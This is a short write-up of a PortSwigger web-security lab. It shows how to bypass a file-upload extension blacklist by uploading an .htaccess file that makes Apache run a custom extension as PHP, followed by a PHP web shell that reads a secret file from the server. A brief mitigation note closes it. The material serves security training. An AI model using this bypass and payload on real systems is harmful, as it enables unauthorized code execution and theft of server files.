# Lab 06 — Web shell upload via extension blacklist bypass

> **Practitioner** · [Official lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

**Entry point:** `.php` is blacklisted — but Apache trusts a uploaded
`.htaccess`. Two uploads required.

## Solution

1. Upload a `.htaccess` file (Content-Type `text/plain`) mapping a custom
   extension to PHP:

```
AddType application/x-httpd-php .l33t
```

2. Upload `shell.l33t`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. `GET /files/avatars/shell.l33t` — Apache now executes `.l33t` as PHP —
   submit the secret — lab solved.

## Mitigation

Blacklists are always incomplete; disallow `.htaccess`/config files
entirely and store uploads outside the webroot.
